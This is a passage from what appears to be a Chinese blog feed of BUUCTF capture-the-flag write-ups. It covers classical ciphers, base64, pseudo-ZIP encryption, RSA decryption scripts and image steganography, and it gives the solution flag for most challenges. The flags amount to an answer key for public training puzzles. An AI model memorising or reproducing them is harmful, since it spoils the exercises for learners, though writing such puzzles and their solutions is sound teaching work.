title="flag{zs19900315}"></a>flag{zs19900315}</h3><h2 id="0x08-一眼就解密"><a href="#0x08-一眼就解密" class="headerlink" title="0x08 一眼就解密"></a>0x08 一眼就解密</h2><h3 id="下面的字符串解密后便能获得flag："><a href="#下面的字符串解密后便能获得flag：" class="headerlink" title="下面的字符串解密后便能获得flag："></a>下面的字符串解密后便能获得flag：</h3><h3 id="ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30"><a href="#ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30" class="headerlink" title="ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30="></a>ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30=</h3><h3 id="注意：得到的-flag，请包上-flag-提交"><a href="#注意：得到的-flag，请包上-flag-提交" class="headerlink" title="注意：得到的 flag，请包上 flag{} 提交"></a>注意：得到的 flag，请包上 flag{} 提交</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">典型的base64</span><br><span class="line">https://base64.supfree.net/</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-THE-FLAG-OF-THIS-STRING"><a href="#flag-THE-FLAG-OF-THIS-STRING" class="headerlink" title="flag{THE_FLAG_OF_THIS_STRING}"></a>flag{THE_FLAG_OF_THIS_STRING}</h3><h2 id="0x09-伪ZIP加密"><a href="#0x09-伪ZIP加密" class="headerlink" title="0x09 伪ZIP加密"></a>0x09 伪ZIP加密</h2><h3 id="注意：得到的-flag-请包上-flag-提交"><a href="#注意：得到的-flag-请包上-flag-提交" class="headerlink" title="注意：得到的 flag 请包上 flag{} 提交"></a>注意：得到的 flag 请包上 flag{} 提交</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">导入UltraEdit，然后在第二个PK头部（50 4B 01 02）后面跟着1F 00 14 00 09 00</span><br><span class="line">只需要将00 09 00 改成00 00 00就可以解压文件拿到flag</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-Adm1N-B2G-kU-SZIP"><a href="#flag-Adm1N-B2G-kU-SZIP" class="headerlink" title="flag{Adm1N-B2G-kU-SZIP}"></a>flag{Adm1N-B2G-kU-SZIP}</h3><h2 id="0x10-丢失的MD5"><a href="#0x10-丢失的MD5" class="headerlink" title="0x10 丢失的MD5"></a>0x10 丢失的MD5</h2><h3 id="注意：得到的-flag-请包上-flag-提交-1"><a href="#注意：得到的-flag-请包上-flag-提交-1" class="headerlink" title="注意：得到的 flag 请包上 flag{} 提交"></a>注意：得到的 flag 请包上 flag{} 提交</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载到脚本后，看了一眼，感觉能直接跑出来，好吧。无脑题</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-e9032994dabac08080091151380478a2"><a href="#flag-e9032994dabac08080091151380478a2" class="headerlink" title="flag{e9032994dabac08080091151380478a2}"></a>flag{e9032994dabac08080091151380478a2}</h3><h2 id="0x11-Rabbit"><a href="#0x11-Rabbit" class="headerlink" title="0x11 Rabbit"></a>0x11 Rabbit</h2><h3 id="题目：U2FsdGVkX1-ydnDPowGbjjJXhZxm2MP2AgI"><a href="#题目：U2FsdGVkX1-ydnDPowGbjjJXhZxm2MP2AgI" class="headerlink" title="题目：U2FsdGVkX1/+ydnDPowGbjjJXhZxm2MP2AgI"></a>题目：U2FsdGVkX1/+ydnDPowGbjjJXhZxm2MP2AgI</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接上解密网站，右下角选择Rabbit</span><br><span class="line">http://tool.chinaz.com/Tools/TextEncrypt.aspx</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/3.png" class="lazyload"></a></p><h3 id="flag-Cute-Rabbit"><a href="#flag-Cute-Rabbit" class="headerlink" title="flag{Cute_Rabbit}"></a>flag{Cute_Rabbit}</h3><h2 id="0x12-传统知识-古典密码"><a href="#0x12-传统知识-古典密码" class="headerlink" title="0x12 传统知识+古典密码"></a>0x12 传统知识+古典密码</h2><h3 id="题目：小明某一天收到一封密信，信中写了几个不同的年份"><a href="#题目：小明某一天收到一封密信，信中写了几个不同的年份" class="headerlink" title="题目：小明某一天收到一封密信，信中写了几个不同的年份"></a>题目：小明某一天收到一封密信，信中写了几个不同的年份</h3><h3 id="辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。"><a href="#辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。" class="headerlink" title="辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。"></a>辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。</h3><h3 id="信的背面还写有“-甲子”，请解出这段密文。"><a href="#信的背面还写有“-甲子”，请解出这段密文。" class="headerlink" title="信的背面还写有“+甲子”，请解出这段密文。"></a>信的背面还写有“+甲子”，请解出这段密文。</h3><h3 id="key值：CTF-XXX"><a href="#key值：CTF-XXX" class="headerlink" title="key值：CTF{XXX}"></a>key值：CTF{XXX}</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先去网上找一个顺序表</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/4.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/4.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">根据表找出不同年份对应的数字，背面说+甲子，于是在每个数字上面再加了60，得到</span><br><span class="line">88  90  83  68  77  70  76  90</span><br><span class="line">根据这些数字，我们的第一反应当然是ASCII，于是找出它对应的字符</span><br><span class="line">XZSDMFLZ</span><br><span class="line">于是用工具先进行栅栏解密、再凯撒解密得到flag</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/5.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/5.jpg" class="lazyload"></a></p><h3 id="flag-SHUANGYU"><a href="#flag-SHUANGYU" class="headerlink" title="flag{SHUANGYU}"></a>flag{SHUANGYU}</h3><h2 id="0x13-RSA"><a href="#0x13-RSA" class="headerlink" title="0x13 RSA"></a>0x13 RSA</h2><h3 id="题目：在一次RSA密钥对生成中，假设p-473398607161，q-4511491，e-17"><a href="#题目：在一次RSA密钥对生成中，假设p-473398607161，q-4511491，e-17" class="headerlink" title="题目：在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17"></a>题目：在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17</h3><h3 id="求解出d作为flag提交"><a href="#求解出d作为flag提交" class="headerlink" title="求解出d作为flag提交"></a>求解出d作为flag提交</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p = 473398607161</span><br><span class="line">q = 4511491</span><br><span class="line">e = 17</span><br><span class="line">n = (p-1)*(q-1)</span><br><span class="line">17d + ni = 1 (i = 1、2、3……)</span><br><span class="line">只需要找到这个d即可</span><br><span class="line">也就是符合 (1-ni)/17能被整除</span><br></pre></td></tr></tbody></table></figure></div><h3 id="脚本如下"><a href="#脚本如下" class="headerlink" title="脚本如下"></a>脚本如下</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">import sys</span><br><span class="line">p = 473398607161</span><br><span class="line">q = 4511491</span><br><span class="line">e = 17</span><br><span class="line">n = (p-1)*(q-1)</span><br><span class="line">i = 0</span><br><span class="line"># 17x + ny = 1</span><br><span class="line">while True:</span><br><span class="line">if((1-n*i)%e == 0):</span><br><span class="line">break;</span><br><span class="line">i-=1</span><br><span class="line">print '%d' % ((1 - n*i)/e)</span><br></pre></td></tr></tbody></table></figure></div><h3 id="运行结果-125631357777427553"><a href="#运行结果-125631357777427553" class="headerlink" title="运行结果: 125631357777427553"></a>运行结果: 125631357777427553</h3><h3 id="flag-125631357777427553"><a href="#flag-125631357777427553" class="headerlink" title="flag{125631357777427553}"></a>flag{125631357777427553}</h3><h2 id="0x14-Alice与Bob"><a href="#0x14-Alice与Bob" class="headerlink" title="0x14 Alice与Bob"></a>0x14 Alice与Bob</h2><h3 id="题目：密码学历史中，有两位知名的杰出人物，Alice和Bob。他们的爱情经过置换和轮加密也难以混淆，即使是没有身份认证也可以知根知底。就像在数学王国中的素数一样，孤傲又热情。下面是一个大整数-98554799767-请分解为两个素数，分解后，小的放前面，大的放后面，合成一个新的数字，进行md5的32位小写哈希，提交答案。"><a href="#题目：密码学历史中，有两位知名的杰出人物，Alice和Bob。他们的爱情经过置换和轮加密也难以混淆，即使是没有身份认证也可以知根知底。就像在数学王国中的素数一样，孤傲又热情。下面是一个大整数-98554799767-请分解为两个素数，分解后，小的放前面，大的放后面，合成一个新的数字，进行md5的32位小写哈希，提交答案。" class="headerlink" title="题目：密码学历史中，有两位知名的杰出人物，Alice和Bob。他们的爱情经过置换和轮加密也难以混淆，即使是没有身份认证也可以知根知底。就像在数学王国中的素数一样，孤傲又热情。下面是一个大整数:98554799767,请分解为两个素数，分解后，小的放前面，大的放后面，合成一个新的数字，进行md5的32位小写哈希，提交答案。"></a>题目：密码学历史中，有两位知名的杰出人物，Alice和Bob。他们的爱情经过置换和轮加密也难以混淆，即使是没有身份认证也可以知根知底。就像在数学王国中的素数一样，孤傲又热情。下面是一个大整数:98554799767,请分解为两个素数，分解后，小的放前面，大的放后面，合成一个新的数字，进行md5的32位小写哈希，提交答案。</h3><h3 id="注意：得到的-flag-请包上-flag-提交-2"><a href="#注意：得到的-flag-请包上-flag-提交-2" class="headerlink" title="注意：得到的 flag 请包上 flag{} 提交"></a>注意：得到的 flag 请包上 flag{} 提交</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">看到是质因数分解，直接用在线分解</span><br><span class="line">https://zh.numberempire.com/numberfactorizer.php</span><br><span class="line">得到：101999*966233</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-d450209323a847c8d01c6be47c81811a"><a href="#flag-d450209323a847c8d01c6be47c81811a" class="headerlink" title="flag{d450209323a847c8d01c6be47c81811a}"></a>flag{d450209323a847c8d01c6be47c81811a}</h3><h2 id="0x15-篱笆墙的影子"><a href="#0x15-篱笆墙的影子" class="headerlink" title="0x15 篱笆墙的影子"></a>0x15 篱笆墙的影子</h2><h3 id="题目：felhaagv-ewtehtehfilnakgw"><a href="#题目：felhaagv-ewtehtehfilnakgw" class="headerlink" title="题目：felhaagv{ewtehtehfilnakgw}"></a>题目：felhaagv{ewtehtehfilnakgw}</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">看着像栅栏密码</span><br><span class="line">https://www.qqxiuzi.cn/bianma/zhalanmima.php</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-wethinkwehavetheflag"><a href="#flag-wethinkwehavetheflag" class="headerlink" title="flag{wethinkwehavetheflag}"></a>flag{wethinkwehavetheflag}</h3><h2 id="0x16-传感器"><a href="#0x16-传感器" class="headerlink" title="0x16 传感器"></a>0x16 传感器</h2><h3 id="题目：5555555595555A65556AA696AA6666666955"><a href="#题目：5555555595555A65556AA696AA6666666955" class="headerlink" title="题目：5555555595555A65556AA696AA6666666955"></a>题目：5555555595555A65556AA696AA6666666955</h3><h3 id="这是某压力传感器无线数据包解调后但未解码的报文-hex"><a href="#这是某压力传感器无线数据包解调后但未解码的报文-hex" class="headerlink" title="这是某压力传感器无线数据包解调后但未解码的报文(hex)"></a>这是某压力传感器无线数据包解调后但未解码的报文(hex)</h3><h3 id="已知其ID为0xFED31F，请继续将报文完整解码，提交hex。"><a href="#已知其ID为0xFED31F，请继续将报文完整解码，提交hex。" class="headerlink" title="已知其ID为0xFED31F，请继续将报文完整解码，提交hex。"></a>已知其ID为0xFED31F，请继续将报文完整解码，提交hex。</h3><h3 id="提示1：曼联"><a href="#提示1：曼联" class="headerlink" title="提示1：曼联"></a>提示1：曼联</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/zz_Caleb/article/details/89331290</span><br></pre></td></tr></tbody></table></figure></div><p>##</p><h2 id="0x17-大帝的密码武器"><a href="#0x17-大帝的密码武器" class="headerlink" title="0x17 大帝的密码武器"></a>0x17 大帝的密码武器</h2><h3 id="题目：公元前一百年，在罗马出生了一位对世界影响巨大的人物，他生前是罗马三巨头之一。他率先使用了一种简单的加密函，因此这种加密方法以他的名字命名。"><a href="#题目：公元前一百年，在罗马出生了一位对世界影响巨大的人物，他生前是罗马三巨头之一。他率先使用了一种简单的加密函，因此这种加密方法以他的名字命名。" class="headerlink" title="题目：公元前一百年，在罗马出生了一位对世界影响巨大的人物，他生前是罗马三巨头之一。他率先使用了一种简单的加密函，因此这种加密方法以他的名字命名。"></a>题目：公元前一百年，在罗马出生了一位对世界影响巨大的人物，他生前是罗马三巨头之一。他率先使用了一种简单的加密函，因此这种加密方法以他的名字命名。</h3><h3 id="以下密文被解开后可以获得一个有意义的单词：FRPHEVGL"><a href="#以下密文被解开后可以获得一个有意义的单词：FRPHEVGL" class="headerlink" title="以下密文被解开后可以获得一个有意义的单词：FRPHEVGL"></a>以下密文被解开后可以获得一个有意义的单词：FRPHEVGL</h3><h3 id="你可以用这个相同的加密向量加密附件中的密文，作为答案进行提交。"><a href="#你可以用这个相同的加密向量加密附件中的密文，作为答案进行提交。" class="headerlink" title="你可以用这个相同的加密向量加密附件中的密文，作为答案进行提交。"></a>你可以用这个相同的加密向量加密附件中的密文，作为答案进行提交。</h3><h3 id="密文：ComeChina"><a href="#密文：ComeChina" class="headerlink" title="密文：ComeChina"></a>密文：ComeChina</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一感觉凯撒密码，发现偏移为13时为有意义单词</span><br></pre></td></tr></tbody></table></figure></div><h2 id="flag-PbzrPuvan"><a href="#flag-PbzrPuvan" class="headerlink" title="flag{PbzrPuvan}"></a>flag{PbzrPuvan}</h2><h2 id="0x18-robomunication"><a href="#0x18-robomunication" class="headerlink" title="0x18 robomunication"></a>0x18 robomunication</h2><h3 id="题目：给了一个mp3"><a href="#题目：给了一个mp3" class="headerlink" title="题目：给了一个mp3"></a>题目：给了一个mp3</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></div><p>##</p><h2 id="0x19-RSA1"><a href="#0x19-RSA1" class="headerlink" title="0x19 RSA1"></a>0x19 RSA1</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 </span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 </span><br><span class="line">dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 </span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 </span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/6.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/6.png" class="lazyload"></a></p><h3 id="用了Hubei师傅的脚本"><a href="#用了Hubei师傅的脚本" class="headerlink" title="用了Hubei师傅的脚本"></a>用了Hubei师傅的脚本</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line">def decrypt(dp,dq,p,q,c):</span><br><span class="line">InvQ = gmpy2.invert(q,p)</span><br><span class="line">mp = pow(c,dp,p)</span><br><span class="line">mq = pow(c,dq,q)</span><br><span class="line">m=(((mp-mq)*InvQ)%p)*q+mq</span><br><span class="line">print (binascii.unhexlify(hex(m)[2:]))</span><br><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 </span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 </span><br><span class="line">dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 </span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 </span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br><span class="line"></span><br><span class="line">decrypt(dp,dq,p,q,c)</span><br></pre></td></tr></tbody></table></figure></div><h3 id="解出来是-noxCTF-W31c0m3-70-Ch1n470wn"><a href="#解出来是-noxCTF-W31c0m3-70-Ch1n470wn" class="headerlink" title="解出来是 noxCTF{W31c0m3_70_Ch1n470wn}"></a>解出来是 noxCTF{W31c0m3_70_Ch1n470wn}</h3><h3 id="flag-W31c0m3-70-Ch1n470wn"><a href="#flag-W31c0m3-70-Ch1n470wn" class="headerlink" title="flag{W31c0m3_70_Ch1n470wn}"></a>flag{W31c0m3_70_Ch1n470wn}</h3><h2 id="0x11-Rabbit-1"><a href="#0x11-Rabbit-1" class="headerlink" title="0x11 Rabbit"></a>0x11 Rabbit</h2><h3 id="题目：U2FsdGVkX1-ydnDPowGbjjJXhZxm2MP2AgI-1"><a href="#题目：U2FsdGVkX1-ydnDPowGbjjJXhZxm2MP2AgI-1" class="headerlink" title="题目：U2FsdGVkX1/+ydnDPowGbjjJXhZxm2MP2AgI"></a>题目：U2FsdGVkX1/+ydnDPowGbjjJXhZxm2MP2AgI</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></div><p>##</p><h2 id="0x11-Rabbit-2"><a href="#0x11-Rabbit-2" class="headerlink" title="0x11 Rabbit"></a>0x11 Rabbit</h2><h3 id="题目：U2FsdGVkX1-ydnDPowGbjjJXhZxm2MP2AgI-2"><a href="#题目：U2FsdGVkX1-ydnDPowGbjjJXhZxm2MP2AgI-2" class="headerlink" title="题目：U2FsdGVkX1/+ydnDPowGbjjJXhZxm2MP2AgI"></a>题目：U2FsdGVkX1/+ydnDPowGbjjJXhZxm2MP2AgI</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></div><p>##</p></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h2 id=&quot;0x01-看我回旋踢&quot;&gt;&lt;a href=&quot;#0x01-看我回旋踢&quot; class=&quot;headerlink&quot; title=&quot;0x01 看我回旋踢&quot;&gt;&lt;/a&gt;0x01 看我回旋踢&lt;/h2&gt;&lt;h3 id=&quot;题目：synt-
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="Crypto" scheme="http://yoursite.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>CTF-BUUCTF-Misc刷题之旅-(1)</title>
    <link href="http://yoursite.com/2019/08/21/CTF-BUUCTF-Misc%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/"/>
    <id>http://yoursite.com/2019/08/21/CTF-BUUCTF-Misc%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/</id>
    <published>2019-08-21T02:21:43.000Z</published>
    <updated>2019-12-18T13:21:58.600Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="0x01-FLAG"><a href="#0x01-FLAG" class="headerlink" title="0x01 FLAG"></a>0x01 FLAG</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">我们先把图片拖入Stegsolve中，然后在上面点击Analyse，点击Data Extract</span><br><span class="line">点击preview，然后在上面的hex的头部发现 50 4B 03 04 ，这是ZIP压缩包的标志</span><br><span class="line">我们点击Save Bin保存为ZIP文件</span><br><span class="line">若出现压缩包数据错误，只需在winrar的上方菜单中找到修复压缩包即可。</span><br><span class="line">然后解压后发现里面是一个linux程序，我们将它拖入IDA中</span><br><span class="line">发现Flag</span><br></pre></td></tr></tbody></table></figure></div><h2 id="flag-dd0gf4c3tok3yb0ard4g41n"><a href="#flag-dd0gf4c3tok3yb0ard4g41n" class="headerlink" title="flag{dd0gf4c3tok3yb0ard4g41n~}"></a>flag{dd0gf4c3tok3yb0ard4g41n<del>~</del>}</h2><h2 id="0x02-另外一个世界"><a href="#0x02-另外一个世界" class="headerlink" title="0x02 另外一个世界"></a>0x02 另外一个世界</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings 图片名</span><br><span class="line">发现末尾有01的字符串，7个7个分离，转为整数，再转为ascii，得到flag</span><br></pre></td></tr></tbody></table></figure></div><h2 id="flag-koekj3s"><a href="#flag-koekj3s" class="headerlink" title="flag{koekj3s}"></a>flag{koekj3s}</h2><h2 id="0x03-小白"><a href="#0x03-小白" class="headerlink" title="0x03 小白"></a>0x03 小白</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用PNG的CRC校对来爆破宽度，然后用hex修改高度</span><br><span class="line">原始高度为256，修改后479</span><br></pre></td></tr></tbody></table></figure></div><h2 id="flag-He1l0-d4-ba1"><a href="#flag-He1l0-d4-ba1" class="headerlink" title="flag{He1l0_d4_ba1}"></a>flag{He1l0_d4_ba1}</h2><h2 id="0x04-派大星的烦恼"><a href="#0x04-派大星的烦恼" class="headerlink" title="0x04 派大星的烦恼"></a>0x04 派大星的烦恼</h2></body></html>]]></content>
    
    <summary type="html">
    
      
      
